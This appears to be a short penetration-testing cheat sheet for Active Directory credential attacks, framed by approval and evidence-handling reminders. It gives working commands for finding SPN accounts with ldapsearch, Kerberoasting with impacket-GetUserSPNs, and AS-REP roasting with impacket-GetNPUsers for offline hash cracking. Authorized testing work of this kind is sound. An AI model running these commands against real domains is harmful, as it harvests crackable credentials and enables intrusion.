# SPN Discovery & Roastable Accounts (Approval required for collection)

Identify accounts with SPNs (Linux)
ldapsearch -H ldap://<IP> -D "DOMAIN\\USER" -W -b "DC=corp,DC=local" "(&(objectCategory=person)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

Kerberoast (collection only with explicit written approval)
# Discover and request TGS for SPN accounts
# impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip <DC_IP> -request -outputfile spns_<DOMAIN>.csv
# The output may include service tickets suitable for offline cracking; handle as sensitive evidence.

AS-REP roast (accounts without preauth; approval required)
# impacket-GetNPUsers DOMAIN/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asreproast_<DOMAIN>.txt

Password cracking
# Use organization-approved cracking policies and wordlists.
# Validate any recovered creds only within scope; stop on success and document.

Notes
- Coordinate with blue team; respect lockouts and monitoring.
- Treat any collected material as highly sensitive; follow handling & destruction policies.
